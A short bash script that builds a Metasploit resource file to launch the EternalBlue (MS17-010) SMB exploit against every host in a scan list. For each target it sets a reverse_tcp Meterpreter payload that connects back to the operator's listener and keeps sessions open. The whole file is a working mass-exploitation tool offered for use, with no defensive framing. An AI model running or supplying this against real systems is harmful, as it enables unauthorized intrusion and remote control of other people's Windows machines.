#!/bin/bash
# etblue_set.sh sets up an .rc script to exploit ms17_010_eternalblue on multiple hosts
# Prepend 445_scan.txt with the [lhost] and [lport] values of the listener in the format:
#         192.168.1.1
#         443
# Usage: bash etblue_set.sh < hosts/445_scan.txt
# Use the resource script in msfconsole > resource [ms1710.rc]

read -p "Set LHOST: " lhost
read -p "Set LPORT: " lport

echo "use exploit/windows/smb/ms17_010_eternalblue" > ./rc/ms1710.rc
echo "set ExitOnSession false" >> ./rc/ms1710.rc
echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> ./rc/ms1710.rc
echo "set LHOST $lhost" >> ./rc/ms1710.rc
echo "set LPORT $lport" >> ./rc/ms1710.rc

while read -p "Set RHOST: " rhost; do
    echo "set RHOST $rhost" >> ./rc/ms1710.rc
    echo "exploit" >> ./rc/ms1710.rc
done
